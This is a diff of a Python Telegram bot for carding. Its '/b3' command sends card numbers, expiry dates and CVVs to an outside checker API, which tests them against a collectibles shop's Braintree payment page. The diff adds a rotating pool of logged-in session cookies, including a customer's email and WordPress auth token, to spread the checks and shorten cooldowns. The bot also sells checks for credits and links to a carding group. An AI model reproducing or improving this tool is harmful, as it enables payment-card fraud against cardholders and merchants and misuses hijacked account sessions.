@@ -3751,7 +3751,10 @@ logger = logging.getLogger(__name__)
 API_URL = "https://autob3cook.onrender.com/check?"
 API_KEY = "Xcracker911"
 SITE = "https://apluscollectibles.com"
-COOKIES = '''_ga_D1Q49TMJ2C=GS2.1.s1757220818$o7$g0$t1757220818$j60$l0$h0;
+# --- Cookie rotation pool ---
+COOKIES_LIST = [
+    # Cookie 1
+    '''_ga_D1Q49TMJ2C=GS2.1.s1757220818$o7$g0$t1757220818$j60$l0$h0;
 wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b=xcrasjwiiwjwr663%7C1758272921%7CBPf39ptFyvGAQ34Dn1nIXF1fvcY5spDCUhlsfKA1Wp4%7C301e75542869a8a7dbbcf88f245dddf67e40a88c925b8b137785ca10d8f0c986;
 sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29;
 cfz_google-analytics_v4=%7B"uoEf_engagementDuration"%3A%7B"v"%3A"0"%2C"e"%3A1788756819052%7D%2C"uoEf_engagementStart"%3A%7B"v"%3A"1757220819052"%2C"e"%3A1788756819052%7D%2C"uoEf_counter"%3A%7B"v"%3A"43"%2C"e"%3A1788756819052%7D%2C"uoEf_session_counter"%3A%7B"v"%3A"8"%2C"e"%3A1788756819052%7D%2C"uoEf_ga4"%3A%7B"v"%3A"0486ee08-be8c-416f-a2a9-e6cc9b586a2c"%2C"e"%3A1788756819052%7D%2C"uoEf__z_ga_audiences"%3A%7B"v"%3A"0486ee08-be8c-416f-a2a9-e6cc9b586a2c"%2C"e"%3A1788099028638%7D%2C"uoEf_let"%3A%7B"v"%3A"1757220819052"%2C"e"%3A1788756819052%7D%2C"uoEf_ga4sid"%3A%7B"v"%3A"1807422450"%2C"e"%3A1757222619052%7D%7D;
@@ -3770,12 +3773,41 @@ dfehc_user=f9046e64c7ce9c01a633953b208018fe;
 mailchimp_landing_site=https%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F;
 sbjs_current_add=fd%3D2025-09-07%2004%3A23%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29;
 sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29;
-sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36'''
+sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36''',
 
-# --- Cooldown tracker (per-user) ---
-user_last_command_time = {}
-COOLDOWN_SECONDS = 20
+    # Cookie 2 (converted to raw string)
+    '''_ga=GA1.1.333862603.1756374247;
+_gcl_au=1.1.1881747356.1756374247;
+mailchimp_landing_site=https%3A%2F%2Fapluscollectibles.com%2F%3Fsrsltid%3DAfmBOoq8FJ6vCoYvJ09H23EDOT6KZUY9kpjaAgQiQSptUqge3sfo4zuV;
+dfehc_user=cbb3a19283b1fa013098d308fc9643ae;
+sbjs_migrations=1418474375998%3D1;
+sbjs_current_add=fd%3D2025-09-10%2007%3A31%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2F%3Fsrsltid%3DAfmBOoqD-funxvPkYkgom1EBxAXl88itxJndWUjeE3rjPIqNCFqTAAfO%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F;
+sbjs_first_add=fd%3D2025-09-10%2007%3A31%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2F%3Fsrsltid%3DAfmBOoqD-funxvPkYkgom1EBxAXl88itxJndWUjeE3rjPIqNCFqTAAfO%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F;
+sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29;
+sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29;
+sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Safari%2F537.36;
+Subscribe=true;
+mailchimp.cart.current_email=maihujiyan@gmail.com;
+mailchimp_user_previous_email=maihujiyan%40gmail.com;
+mailchimp_user_email=maihujiyan%40gmail.com;
+breeze_folder_name=6bae3cd94ddbfe28435ae88815e64956a5198266;
+wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b=maihujiyan%7C1758700897%7CxK4lY1UHm6sxwxw3XIDDtUhvbfTyVpCm1sMVrqhSHBU%7Ca9cb414769c030ac993c3b41bedc11db8b9b53fe7940719a35c5e5543d958c43;
+wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f=9043%7Cother%7Cread%7C73e129a8c5b2c2224a65315f993e96448b8948c8090c76ce36fed065511e9da5;
+cfzs_google-analytics_v4=%7B%22uoEf_pageviewCounter%22%3A%7B%22v%22%3A%229%22%7D%7D;
+_ga_D1Q49TMJ2C=GS2.1.s1757491263$o10$g1$t1757491354$j30$l0$h0;
+sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fadd-payment-method'''
+]
 
+cookie_index = 0
+
+def get_next_cookie():
+    global cookie_index
+    cookie = COOKIES_LIST[cookie_index]
+    cookie_index = (cookie_index + 1) % len(COOKIES_LIST)  # rotate cookies
+    return cookie
+
+# Adjust cooldown dynamically based on cookie count
+COOLDOWN_SECONDS = BASE_COOLDOWN // len(COOKIES_LIST)  # e.g., 2 cookies → 10s
 
 # --- Credit System ---
 async def consume_credit(user_id: int) -> bool:
@@ -3789,22 +3821,21 @@ async def consume_credit(user_id: int) -> bool:
         logger.warning(f"[consume_credit] Error updating user {user_id}: {e}")
     return False
 
-
 # --- Command Handler (/b3) ---
 async def b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
     current_time = time.time()
 
-    # --- Check if card args are provided ---
+    # --- Check card args ---
     if not context.args:
         await update.message.reply_text(
             "Usage: `/b3 cc|mm|yyyy|cvv`",
             parse_mode="Markdown"
         )
-        return  # ❌ no cooldown if no args
+        return  # no cooldown if no args
 
-    # --- Cooldown check (only for valid usage) ---
+    # --- Cooldown check ---
     if user_id in user_last_command_time:
         elapsed = current_time - user_last_command_time[user_id]
         if elapsed < COOLDOWN_SECONDS:
@@ -3815,12 +3846,11 @@ async def b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             return
 
-    # ✅ Set cooldown only after proper usage
+    # ✅ Set cooldown
     user_last_command_time[user_id] = current_time
 
     cc_input = context.args[0]
     full_card = cc_input
-
     BULLET_GROUP_LINK = "https://t.me/CARDER33"
     bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
@@ -3837,10 +3867,8 @@ async def b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
         disable_web_page_preview=True
     )
 
-    # 🔥 Run check in background
+    # --- Run check in background ---
     asyncio.create_task(run_braintree_check(user, cc_input, full_card, processing_msg))
-
-
 
 # --- Background Task ---
 async def run_braintree_check(user, cc_input, full_card, processing_msg):
@@ -3848,7 +3876,13 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
     bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
     # --- API request ---
-    params = {"key": API_KEY, "site": SITE, "cookies": COOKIES, "cc": cc_input}
+    params = {
+        "key": API_KEY,
+        "site": SITE,
+        "cookies": get_next_cookie(),
+        "cc": cc_input
+    }
+
     try:
         timeout = aiohttp.ClientTimeout(total=20)
         async with aiohttp.ClientSession(timeout=timeout) as session:
@@ -3861,7 +3895,7 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
         )
         return
 
-    # --- API response fields ---
+    # --- API response ---
     cc = data.get("cc", cc_input)
     response = data.get("response", "No response")
     status = data.get("status", "UNKNOWN").upper()
@@ -3889,12 +3923,11 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
     # --- User info ---
     full_name = " ".join(filter(None, [user.first_name, user.last_name]))
     requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
-
     DEVELOPER_NAME = "kคli liຖนxx"
     DEVELOPER_LINK = "https://t.me/Kalinuxxx"
     developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
 
-    # --- Credit consume (only on success) ---
+    # --- Credit consume ---
     credit_ok = await consume_credit(user.id)
     if not credit_ok:
         await processing_msg.edit_text(
@@ -3903,7 +3936,7 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
         )
         return
 
-    # --- Final formatted message ---
+    # --- Final message ---
     final_msg = (
         f"◇━━〔 {stylish_status} 〕━━◇\n"
         f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
@@ -3927,7 +3960,6 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
         )
     except Exception as e:
         logger.exception("Error editing final message")
-
 
 
 
